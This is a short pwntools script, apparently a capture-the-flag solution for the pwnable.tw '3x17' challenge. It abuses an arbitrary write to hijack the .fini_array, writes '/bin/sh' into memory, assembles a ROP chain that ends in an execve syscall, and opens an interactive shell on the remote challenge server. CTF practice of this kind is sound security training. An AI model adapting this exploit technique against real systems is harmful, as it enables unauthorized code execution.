from pwn import *
from struct import pack

e = ELF("./3x17")

context.binary = e
context.terminal = ["konsole", "-e"]

p = process([e.path])
p = remote("chall.pwnable.tw", 10105)

context.log_level="debug"
#gdb.attach(p, """break * 0x4022b4""")


"""
break * 0x402960
break * 0x00401ba3
break * 0x00401bf4
"""

main = 0x401b6d
start = 0x401b71

exit = 0x402960



#gadgasjksdf
ret = 0x401016
add_rax_1 = 0x471810
syscall = 0x4022b4
pop_rdi = 0x401696
pop_rdx = 0x446e35
pop_rsi = 0x406c30



# ptr at 0x4b40f8 gets called

p.recvuntil(":")
p.sendline(str(0x4b40f0))


p.recvuntil(":")

p.send(p64(exit) + p64(main))





p.recvuntil(":")
p.sendline(str(0x4ba000))

p.recvuntil(":")

p.send("/bin/sh\x00")


p.recvuntil(":")
p.sendline(str(0x4ba060))

p.recvuntil(":")

p.send(p64(0x4ba000))


for i in range(56):     # idk why but rax starts at 3 or sm
    p.recvuntil(":")
    p.sendline(str(0x4b4108 + i*8))


    p.recvuntil(":")

    p.send(p64(add_rax_1))




p.recvuntil(":")
p.sendline(str(0x4b42c8))


p.recvuntil(":")

p.send(p64(pop_rdi) + p64(0x4ba000) + p64(pop_rdx))


p.recvuntil(":")
p.sendline(str(0x4b42e0))


p.recvuntil(":")

p.send(p64(0) + p64(pop_rsi) + p64(0x4ba060))



p.recvuntil(":")
p.sendline(str(0x4b42f8))


p.recvuntil(":")

p.send(p64(syscall))



p.recvuntil(":")
p.sendline(str(0x4b40f0))

p.recvuntil(":")

p.send(p64(start) + p64(ret) + p64(add_rax_1))







p.interactive()




